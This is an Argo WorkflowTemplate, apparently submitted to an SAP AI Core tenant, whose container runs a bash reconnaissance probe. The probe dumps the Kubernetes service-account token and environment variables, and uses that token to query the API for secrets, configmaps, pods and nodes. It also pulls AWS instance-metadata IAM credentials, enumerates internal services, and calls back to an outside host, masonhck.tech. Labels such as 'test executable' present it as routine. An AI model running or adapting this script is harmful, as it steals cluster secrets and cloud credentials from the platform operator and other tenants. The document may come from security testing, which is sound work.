apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "15.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V15 PROBE START ==="
        echo "HOSTNAME=$(hostname)"
        echo "NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo NONE)"
        echo "SA_TOKEN_EXISTS=$(test -f /var/run/secrets/kubernetes.io/serviceaccount/token && echo YES || echo NO)"

        # K8s Service Account
        echo "=== K8S SA TOKEN (first 100 chars) ==="
        head -c 100 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO TOKEN"
        echo ""

        echo "=== K8S CA CERT ==="
        ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null

        echo "=== ENVIRONMENT VARIABLES ==="
        env | sort | head -80

        echo "=== RESOLV.CONF ==="
        cat /etc/resolv.conf 2>/dev/null

        echo "=== DNS LOOKUPS ==="
        for svc in kubernetes kubernetes.default kubernetes.default.svc; do
          echo "DNS: $svc = $(dig +short $svc 2>/dev/null || nslookup $svc 2>/dev/null | grep Address | tail -1)"
        done

        # Probe K8s API
        echo "=== K8S API PROBE ==="
        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        K8S="https://kubernetes.default.svc"
        if [ -n "$SA_TOKEN" ]; then
          echo "--- /api ---"
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api" 2>&1 | head -c 500
          echo ""
          echo "--- /apis ---"
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/apis" 2>&1 | head -c 1000
          echo ""
          echo "--- /api/v1/namespaces ---"
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces" 2>&1 | head -c 2000
          echo ""
          echo "--- /api/v1/pods (own namespace) ---"
          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces/$NS/pods" 2>&1 | head -c 2000
          echo ""
          echo "--- /api/v1/secrets (own namespace) ---"
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces/$NS/secrets" 2>&1 | head -c 2000
          echo ""
          echo "--- /api/v1/configmaps (own namespace) ---"
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces/$NS/configmaps" 2>&1 | head -c 2000
          echo ""
          echo "--- /api/v1/services (all namespaces) ---"
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/services" 2>&1 | head -c 3000
          echo ""
          echo "--- /api/v1/nodes ---"
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/nodes" 2>&1 | head -c 2000
          echo ""
        else
          echo "No SA token found"
          # Try without auth
          curl -sk "$K8S/api" 2>&1 | head -c 500
        fi

        # Network scanning
        echo "=== NETWORK SCAN ==="
        echo "--- IMDS ---"
        curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 500
        echo ""
        echo "--- IMDSv2 ---"
        IMDS_TOKEN=$(curl -s -X PUT --connect-timeout 3 "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)
        if [ -n "$IMDS_TOKEN" ]; then
          echo "IMDSv2 TOKEN OBTAINED"
          curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 500
          echo ""
          curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 500
        fi
        echo ""

        # Mounted secrets/volumes
        echo "=== MOUNTED VOLUMES ==="
        mount | grep -E "(secret|configmap|projected|emptyDir)" | head -20
        echo "--- /tmp ---"
        ls -la /tmp/ 2>/dev/null | head -10
        echo "--- /var/run ---"
        find /var/run -type f 2>/dev/null | head -20

        # Internal service discovery
        echo "=== INTERNAL SERVICES ==="
        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
        DNS_DOMAIN=$(cat /etc/resolv.conf | grep search | head -1)
        echo "Search domain: $DNS_DOMAIN"

        # Try common internal services
        for svc in argocd-server argocd-repo-server redis loki grafana prometheus kube-state-metrics istio-pilot; do
          for ns in argocd argo monitoring istio-system kube-system default; do
            IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
            [ -n "$IP" ] && echo "FOUND: ${svc}.${ns} = $IP"
          done
        done

        echo "=== CALLBACK TEST ==="
        curl -s --connect-timeout 5 "https://www.masonhck.tech/cb.php?src=v15-test" 2>&1
        echo "CALLBACK_EXIT=$?"

        echo "=== V15 PROBE COMPLETE ==="
